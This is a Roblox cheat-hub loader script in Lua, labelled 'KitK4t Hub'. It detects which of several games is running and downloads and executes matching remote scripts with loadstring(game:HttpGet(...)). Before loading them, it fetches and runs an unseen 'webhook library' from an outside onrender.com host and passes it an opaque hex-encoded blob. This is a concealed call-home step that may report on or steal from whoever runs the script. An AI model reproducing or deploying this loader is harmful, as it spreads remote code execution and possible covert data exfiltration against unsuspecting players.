-- CONFIG
local BROOKHAVEN_PLACEID = 4924922222

-- Roube um Brainrot
local brainrot_PLACEID_MAIN = 109983668079237
local brainrot_PLACEID_NEW  = 96342491571673

-- Car Dealership
local CARDEALER_PLACEID = 1554960397

local brainrotUrl = "https://api.rubis.app/v2/scrap/yeIwd4GtzoIs3jEB/raw"
local cardealerUrl  = "https://api.rubis.app/v2/scrap/KCHqlYKLFkFO0a4W/raw"
local brookhavenUrl = "https://api.rubis.app/v2/scrap/vk01i5gl1i7wg1tZ/raw"
local universalUrl  = "https://api.rubis.app/v2/scrap/xQcqCfCZHddaQr2R/raw"

getgenv().bloxWebhookHost = "https://blox-webhook-notifier.onrender.com"

local cryptUrl = "0389d0791374775d0f7be90039cac32243facebcbdb8b4dc83323fcd48f83a06d058c9761a2746cd78b46f5df3216f5b8bd6175f3ab2b6e677a67bc270484decf6301ffac50abb7f57861b5ec727bb3f8e0f20070dcef187a6f785c24dc6b3b5d1314957bfbad3e67c58f360280b8bf7409c65ac394d669aebe2fbe6d082435fcb5b3f5eca713cf65b8dfb5c47ff9e47606e852d4a14061bdc5e0226abe3f7384578de7508b46f0786400665be5974c86d52fb4b2c24ca8fdb01368f74f4d33e1c95a0d251be81de90f036220e3bc3174bdb781e5b0368a56e831fc1c760c4a0"


-- WEBHOOK LIB
local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()
requestWebhook(cryptUrl)

-----------------------------------------------------
-- FAST LOAD
-----------------------------------------------------
local function fastLoad(url)
    local src = game:HttpGet(url)
    loadstring(src)()
end

-----------------------------------------------------
-- DETECÇÃO DO JOGO
-----------------------------------------------------
local id = game.PlaceId

if id == BROOKHAVEN_PLACEID then
    print("[KitK4t Hub] Brookhaven detectado. Carregando script...")
    fastLoad(brookhavenUrl)

elseif id == brainrot_PLACEID_MAIN or id == brainrot_PLACEID_NEW then
    print("[KitK4t Hub] Roube um Brainrot detectado. Carregando script...")
    fastLoad(brainrotUrl)

elseif id == CARDEALER_PLACEID then
    print("[KitK4t Hub] Car Dealership detectado. Carregando script...")
    fastLoad(cardealerUrl)

else
    print("[KitK4t Hub] Jogo não identificado. Carregando script universal...")
    fastLoad(universalUrl)
end
